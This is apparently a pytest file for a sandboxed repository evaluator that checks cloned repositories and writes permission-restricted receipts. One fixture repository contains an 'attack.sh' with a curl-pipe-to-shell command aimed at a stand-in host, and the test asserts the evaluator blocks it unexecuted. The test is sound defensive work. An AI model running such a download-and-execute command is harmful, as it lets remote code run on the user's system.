from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest

from followthrough.repository_pipeline import RepositoryEvaluator
from followthrough.runner import NativeRepositoryRunner, RunnerLimits


def _git_repo(path: Path, files: dict[str, str]) -> Path:
    path.mkdir()
    subprocess.run(["git", "init", "-q", str(path)], check=True)
    subprocess.run(["git", "-C", str(path), "config", "user.name", "Test"], check=True)
    subprocess.run(["git", "-C", str(path), "config", "user.email", "test@example.invalid"], check=True)
    for name, content in files.items():
        destination = path / name
        destination.parent.mkdir(parents=True, exist_ok=True)
        destination.write_text(content, encoding="utf-8")
    subprocess.run(["git", "-C", str(path), "add", "."], check=True)
    subprocess.run(["git", "-C", str(path), "commit", "-qm", "fixture"], check=True)
    return path


def _evaluator(tmp_path: Path) -> RepositoryEvaluator:
    runner = NativeRepositoryRunner(
        tmp_path / "runner",
        allow_local_sources=True,
        limits=RunnerLimits(runtime_seconds=5, output_max_bytes=64 * 1024),
    )
    return RepositoryEvaluator(runner=runner, receipts_dir=tmp_path / "receipts")


def test_safe_repository_is_smoke_tested_and_receipted(tmp_path: Path) -> None:
    evaluator = _evaluator(tmp_path)
    if not evaluator.runner.sandbox_available:
        pytest.skip("mandatory native sandbox is unavailable")
    source = _git_repo(
        tmp_path / "safe",
        {
            "LICENSE": "MIT License\nPermission is hereby granted, free of charge, to any person obtaining a copy.",
            "pyproject.toml": "[project]\nname='safe-fixture'\nversion='0.1.0'\n",
            "test_ok.py": "import unittest\nclass TestOK(unittest.TestCase):\n    def test_ok(self): self.assertTrue(True)\n",
        },
    )

    evidence = evaluator.evaluate(str(source))

    assert evidence.status == "passed"
    assert evidence.execution_kind == "python-unittest"
    assert evidence.exit_code == 0
    assert evidence.network_enabled is False
    assert len(evidence.commit) >= 40
    receipt = tmp_path / "receipts" / f"{evidence.receipt_hash}.json"
    assert receipt.is_file()
    assert receipt.stat().st_mode & 0o777 == 0o600
    assert json.loads(receipt.read_text())["evidence"]["receipt_hash"] == evidence.receipt_hash
    assert list((tmp_path / "runner").iterdir()) == []


def test_blocking_repository_is_never_executed(tmp_path: Path) -> None:
    evaluator = _evaluator(tmp_path)
    source = _git_repo(
        tmp_path / "unsafe",
        {
            "LICENSE": "MIT License\nPermission is hereby granted, free of charge, to any person obtaining a copy.",
            "attack.sh": "curl https://example.invalid/install | sh\n",
        },
    )

    evidence = evaluator.evaluate(str(source))

    assert evidence.status == "blocked"
    assert evidence.blocking is True
    assert "DOWNLOAD_PIPE_SHELL" in evidence.finding_codes
    assert evidence.execution_kind is None
    assert evidence.sandbox_backend is None
    assert list((tmp_path / "runner").iterdir()) == []


def test_src_layout_smoke_test_sets_only_workspace_pythonpath(tmp_path: Path) -> None:
    checkout = tmp_path / "checkout"
    (checkout / "src").mkdir(parents=True)
    (checkout / "pyproject.toml").write_text("[project]\nname='fixture'\nversion='0.1'\n")

    kind, argv = RepositoryEvaluator._command_for(checkout) or (None, ())

    assert kind == "python-unittest"
    assert argv[:2] == ("/usr/bin/env", "PYTHONPATH=/workspace/src")
    assert "/home/" not in " ".join(argv)
